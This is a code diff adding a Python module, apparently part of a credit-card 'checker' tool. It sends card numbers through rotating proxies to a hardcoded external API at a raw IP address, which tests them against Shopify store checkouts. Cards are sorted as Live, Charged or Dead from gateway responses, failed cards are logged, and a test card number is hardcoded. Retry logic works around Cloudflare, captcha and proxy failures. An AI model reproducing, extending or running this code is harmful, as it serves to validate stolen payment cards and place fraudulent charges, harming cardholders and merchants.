@@ -1,0 +1,448 @@
+"""
+check_engine.py — Card checking engine + proxy utilities + universal proxy parser
+API-BASED VERSION
+"""
+import asyncio
+import aiohttp
+import random
+import os
+import re
+import httpx
+import time
+from typing import Optional
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# 🎯 API ENDPOINTS — rotate through these automatically
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+API_URLS = [
+    "http://198.71.52.78:8083/shopify",
+]
+
+_API_TIMEOUT = httpx.Timeout(connect=5.0, read=60.0, write=5.0, pool=10.0)
+
+_http_client: httpx.AsyncClient | None = None
+_client_lock = asyncio.Lock()
+
+_session_bad_sites: set[str] = set()
+
+
+def clear_session_bad_sites():
+    global _session_bad_sites
+    _session_bad_sites = set()
+
+
+async def _get_client() -> httpx.AsyncClient:
+    global _http_client
+    async with _client_lock:
+        if _http_client is None or _http_client.is_closed:
+            _http_client = httpx.AsyncClient(
+                timeout=_API_TIMEOUT,
+                limits=httpx.Limits(
+                    max_connections=2000,
+                    max_keepalive_connections=500,
+                    keepalive_expiry=60.0,
+                ),
+            )
+    return _http_client
+
+
+def _make_result(card, status, message, price='-', gateway='Shopify Payments',
+                 receipt_url='', retryable=False, proxy='', time=None):
+    return {
+        'status':      status,
+        'message':     message,
+        'card':        card,
+        'gateway':     gateway,
+        'price':       price,
+        'receipt_url': receipt_url,
+        'retry':       retryable,
+        'proxy':       proxy,
+        'time':        time,
+    }
+
+
+_PROXY_ERR_SIGNALS = (
+    'connection timed out', 'connection timeout', 'timed out',
+    'proxy error', 'proxy dead', 'proxy_error',
+    'eof occurred', 'remote end closed', 'failed to perform',
+    'connection refused', 'connect tunnel failed',
+)
+
+
+def _is_proxy_err(msg: str) -> bool:
+    m = (msg or '').lower()
+    return any(s in m for s in _PROXY_ERR_SIGNALS)
+
+
+def _normalize_api_url(url: str) -> str:
+    url = url.strip().rstrip("/")
+    if not url.endswith("/shopify"):
+        url = url + "/shopify"
+    return url
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# 🔌 UNIVERSAL PROXY PARSER
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def _is_valid_host(host: str) -> bool:
+    if not host or len(host) < 4:
+        return False
+    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', host):
+        octets = host.split('.')
+        return all(0 <= int(o) <= 255 for o in octets)
+    if re.match(r'^[a-zA-Z0-9][a-zA-Z0-9.\-]*\.[a-zA-Z]{2,}$', host):
+        return True
+    return False
+
+
+def _is_valid_port(port: str) -> bool:
+    return port.isdigit() and 1 <= int(port) <= 65535
+
+
+def _proxy_to_url(proxy: str) -> str:
+    if not proxy:
+        return ''
+    p = proxy.strip()
+    if any(x in p.lower() for x in ('myshopify', '.com/', 'https:///', 'http:///')):
+        return ''
+    protocol = 'http'
+    for prefix in ('http://', 'https://', 'socks5://', 'socks4://'):
+        if p.lower().startswith(prefix):
+            protocol = prefix[:-3]
+            p = p[len(prefix):]
+            break
+    p = p.strip('/')
+    if '@' in p:
+        auth, host_part = p.rsplit('@', 1)
+        if ':' in host_part:
+            host, port = host_part.rsplit(':', 1)
+            if _is_valid_host(host) and _is_valid_port(port):
+                return f'{protocol}://{auth}@{host}:{port}'
+        return ''
+    parts = p.split(':')
+    if len(parts) == 2:
+        host, port = parts
+        if _is_valid_host(host) and _is_valid_port(port):
+            return f'{protocol}://{host}:{port}'
+        return ''
+    if len(parts) == 4:
+        a, b, c, d = parts
+        if _is_valid_host(a) and _is_valid_port(b):
+            return f'{protocol}://{c}:{d}@{a}:{b}'
+        if _is_valid_host(c) and _is_valid_port(d):
+            return f'{protocol}://{a}:{b}@{c}:{d}'
+        return ''
+    space_parts = p.split()
+    if len(space_parts) == 4:
+        a, b, c, d = space_parts
+        if _is_valid_host(c) and _is_valid_port(d):
+            return f'{protocol}://{a}:{b}@{c}:{d}'
+        if _is_valid_host(a) and _is_valid_port(b):
+            return f'{protocol}://{c}:{d}@{a}:{b}'
+    return ''
+
+
+def _sanitize_proxy(proxy: str) -> str:
+    if not proxy:
+        return ''
+    p = proxy.strip()
+    if any(x in p.lower() for x in ('myshopify', '.com/', 'https:///', 'http:///')):
+        return ''
+    if ':///' in p:
+        p = p.replace(':///', '://')
+    return p
+
+
+def _strip_protocol(proxy: str) -> str:
+    p = proxy.strip()
+    for prefix in ("http://", "https://", "socks5://", "socks4://"):
+        if p.startswith(prefix):
+            p = p[len(prefix):]
+    return p
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# 🎯 API CALL
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def _normalize_shop_url(shop_url: str) -> str:
+    if not shop_url:
+        return ""
+    s = shop_url.strip()
+    s = re.sub(r'^https:\/+', 'https://', s, flags=re.I)
+    s = re.sub(r'^http:\/+', 'http://', s, flags=re.I)
+    if not re.match(r'^https?://', s, flags=re.I):
+        s = 'https://' + s.lstrip('/')
+    try:
+        from urllib.parse import urlparse
+        p = urlparse(s)
+        if not p.netloc:
+            return ""
+        return f"{(p.scheme or 'https').lower()}://{p.netloc.lower()}"
+    except Exception:
+        return ""
+
+
+async def _call_api(shop_url: str, card: str, proxy_raw: str) -> dict:
+    c = await _get_client()
+    clean_proxy = _sanitize_proxy(proxy_raw)
+    if not clean_proxy:
+        return _make_result(card, 'Dead', message="Invalid proxy format", retryable=True)
+    proxy_url = _proxy_to_url(clean_proxy)
+    if not proxy_url:
+        return _make_result(card, 'Dead', message="Invalid proxy format", retryable=True)
+    shop_url = _normalize_shop_url(shop_url)
+    if not shop_url:
+        return _make_result(card, 'Dead', message="Invalid site URL", retryable=True)
+
+    params = {
+        "site":  shop_url,
+        "cc":    card,
+        "proxy": _strip_protocol(clean_proxy),
+    }
+    # Optional: API key for per-user concurrency (default: default)
+    # Add key param if needed:
+    # params["key"] = "default"
+
+    last_error = None
+    tried = set()
+
+    for _ in range(3):
+        candidates = [u for u in API_URLS if u not in tried] or API_URLS
+        api_url = _normalize_api_url(random.choice(candidates))
+        tried.add(api_url)
+        try:
+            r = await c.get(api_url, params=params)
+            if r.status_code != 200:
+                last_error = f"HTTP {r.status_code}"
+                continue
+            data = r.json()
+            raw_response = str(data.get("Response") or data.get("RawResponse") or "")
+            status_raw   = str(data.get("Status") or "")   # IGNORED
+            gateway      = str(data.get("Gateway") or "Shopify Payments")
+            price        = str(data.get("Price") or "-")
+            
+            # Currency support
+            currency = str(data.get("Currency") or "USD")
+            if currency != "USD":
+                price = f"{price} {currency}"
+            
+            if " [" in price:
+                price = price.split(" [")[0]
+
+            # ═══════════════════════════════════════════════════════════════
+            #  ONLY RESPONSE + PRICE MATTER — Status field is IGNORED
+            # ═══════════════════════════════════════════════════════════════
+            resp_up = raw_response.upper()
+
+            # ── 1. PROXY ERROR (retry) ──
+            if any(k in resp_up for k in (
+                "PROXY", "CONNECTION TIMED OUT", "TIMED OUT", "TIMEOUT",
+                "EOF OCCURRED", "REMOTE END CLOSED", "CONNECTION REFUSED",
+                "CONNECT TUNNEL FAILED", "FAILED TO PERFORM",
+            )):
+                return _make_result(card, 'Dead',
+                                    message=raw_response,
+                                    retryable=True, proxy=clean_proxy)
+
+            # ── 2. SITE / STEP ERROR (retry) ──
+            if any(k in resp_up for k in (
+                "STEP 0", "STEP 1", "STEP 2", "STEP 3", "STEP 4", "STEP 5",
+                "SITE ERROR", "SITE NOT", "NOT SHOPIFY", "CLOUDFLARE",
+                "CAPTCHA", "CHANGE PROXY", "HTTP_5", "HTTP 5",
+                "CART FAILED", "NO PRODUCT", "INVENTORY",
+            )):
+                return _make_result(card, 'Dead',
+                                    message=raw_response,
+                                    retryable=True, proxy=clean_proxy)
+
+            # ── 3. DECLINED (exact match) ──
+            declined_exact = (
+                "CARD_DECLINED", "PAYMENT_FAILED", "MISMATCHED_BILL",
+                "DO_NOT_HONOR", "PAYMENT_METHOD_NOT_AVAILABLE",
+                "CARD_EXPIRED", "INVALID_CARD", "GENERIC_ERROR",
+                "INVALID_CVC", "INCORRECT_CVC", "INCORRECT_ZIP",
+                "CARD NOT SUPPORTED", "CARD_NOT_SUPPORTED",
+                "SITE_REQUIRES_LOGIN", "SITE NOT SUPPORTED",
+            )
+            if any(k in resp_up for k in declined_exact):
+                return _make_result(card, 'Dead',
+                                    message=raw_response or "Card Declined",
+                                    price=price, gateway=gateway,
+                                    proxy=clean_proxy, retryable=False)
+
+            # ── 4. LIVE (insufficient funds, 3ds) ──
+            live_exact = (
+                "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS",
+                "PAYMENTS_INSUFFICIENT_FUNDS", "NOT ENOUGH FUNDS",
+                "NOT_ENOUGH_FUNDS", "LOW BALANCE", "LOW_BALANCE",
+                "3DS_REQUIRED", "OTP_REQUIRED", "AUTHENTICATION_REQUIRED",
+                "AUTHENTICATION REQUIRED", "3D SECURE", "OTP REQUIRED",
+                "INSUFFICIENT", "NSF", "FUNDS",
+            )
+            if any(k in resp_up for k in live_exact):
+                return _make_result(card, 'Live',
+                                    message=raw_response or "Card Live",
+                                    price=price, gateway=gateway,
+                                    proxy=clean_proxy)
+
+            # ── 5. CHARGED (order placed / success) ──
+            charged_exact = (
+                "ORDER_PAID", "ORDER_PLACED", "CHARGED",
+                "THANK YOU", "PAYMENT_SUCCESSFUL", "PAYMENT SUCCESSFUL",
+                "CAPTURED_SUCCESSFULLY", "PAYMENT CAPTURED",
+                "SUCCESSFULLY CHARGED",
+            )
+            if any(k in resp_up for k in charged_exact):
+                return _make_result(card, 'Charged',
+                                    message=raw_response or "Payment captured",
+                                    price=price, gateway=gateway,
+                                    receipt_url=data.get("ReceiptUrl", ""),
+                                    proxy=clean_proxy)
+
+            # ── 6. DEFAULT → Declined (safe) ──
+            return _make_result(card, 'Dead',
+                                message=raw_response or "Unknown",
+                                price=price, gateway=gateway,
+                                proxy=clean_proxy, retryable=False)
+
+        except httpx.TimeoutException:
+            last_error = "API timeout"
+            continue
+        except httpx.ConnectError:
+            last_error = "API unreachable"
+            continue
+        except Exception as e:
+            last_error = str(e)[:80]
+            continue
+
+    return _make_result(card, 'Dead',
+                        message=f"All APIs failed: {last_error or 'unknown'}",
+                        retryable=True)
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# 🧪 SITE CHECK
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+async def test_site(site: str, proxy: str) -> dict:
+    test_card = "5154623245618097|03|2032|156"
+    try:
+        result = await _call_api(site, test_card, proxy)
+        if result['status'] in ('Charged', 'Approved'):
+            return {'site': site, 'status': 'alive'}
+        if result.get('message') and 'API' not in result['message'] and 'proxy' not in result['message'].lower():
+            return {'site': site, 'status': 'alive'}
+        return {'site': site, 'status': 'dead', 'msg': result.get('message', '')[:100]}
+    except Exception as e:
+        msg = str(e)[:80]
+        if 'step' in msg.lower():
+            return {'site': site, 'status': 'step_error', 'msg': msg}
+        return {'site': site, 'status': 'dead', 'msg': msg}
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# 🔁 MAIN CARD CHECKER
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy=None):
+    if not sites:
+        return _make_result(card, 'Dead', 'No sites configured')
+    if not proxies:
+        return _make_result(card, 'Dead', 'No proxy configured')
+
+    last_err = 'Unknown error'
+    MAX_TRIES = 4
+    failed_sites = set()
+
+    for attempt in range(MAX_TRIES):
+        available = [s for s in sites if s not in failed_sites] or list(sites)
+        shop_url  = random.choice(available)
+        proxy_raw = (start_proxy if attempt == 0 and start_proxy else random.choice(proxies))
+
+        clean_proxy = _sanitize_proxy(proxy_raw)
+        if not clean_proxy:
+            last_err = "Invalid proxy format (skipped)"
+            continue
+
+        try:
+            result = await _call_api(shop_url, card, clean_proxy)
+        except Exception as e:
+            last_err = str(e)
+            failed_sites.add(shop_url)
+            await asyncio.sleep(0.05)
+            continue
+
+        if result['status'] in ('Charged', 'Approved'):
+            result['proxy'] = clean_proxy
+            return result
+
+        if result['status'] == 'Dead' and not result.get('retry'):
+            return result
+
+        last_err = result.get('message', 'Retryable error')
+        if _is_proxy_err(last_err):
+            await asyncio.sleep(0.05)
+            continue
+        if 'step 0' in last_err.lower() or 'no product' in last_err.lower():
+            failed_sites.add(shop_url)
+        await asyncio.sleep(0.05)
+
+    _log_error_card(card, last_err)
+    return _make_result(card, 'Dead', last_err)
+
+
+def clear_error_log():
+    try:
+        open("error.txt", 'w').close()
+    except Exception:
+        pass
+
+
+def _log_error_card(card: str, reason: str):
+    try:
+        with open("error.txt", 'a', encoding='utf-8') as f:
+            f.write(f"{card}  # {reason[:100]}\n")
+    except Exception:
+        pass
+
+
+async def test_proxy(proxy: str) -> dict:
+    proxy_url = _proxy_to_url(proxy)
+    if not proxy_url:
+        return {'proxy': proxy, 'status': 'dead', 'error': 'Invalid format'}
+    test_urls = [
+        'http://httpbin.org/ip',
+        'http://api.ipify.org',
+        'http://icanhazip.com',
+    ]
+    try:
+        timeout = aiohttp.ClientTimeout(total=15)
+        conn    = aiohttp.TCPConnector(ssl=False)
+        async with aiohttp.ClientSession(timeout=timeout, connector=conn) as s:
+            for url in test_urls:
+                try:
+                    async with s.get(url, proxy=proxy_url, allow_redirects=True) as r:
+                        if r.status == 200:
+                            return {'proxy': proxy, 'status': 'alive'}
+                except Exception:
+                    continue
+        return {'proxy': proxy, 'status': 'dead'}
+    except Exception:
+        return {'proxy': proxy, 'status': 'dead'}
+
+
+async def get_proxy_ip(proxy: str) -> str | None:
+    proxy_url = _proxy_to_url(proxy)
+    if not proxy_url or proxy_url.startswith('socks'):
+        return None
+    try:
+        timeout = aiohttp.ClientTimeout(total=15)
+        async with aiohttp.ClientSession(timeout=timeout) as s:
+            async with s.get('https://api.ipify.org', proxy=proxy_url) as r:
+                if r.status == 200:
+                    return (await r.text()).strip()
+    except Exception:
+        pass
+    return None
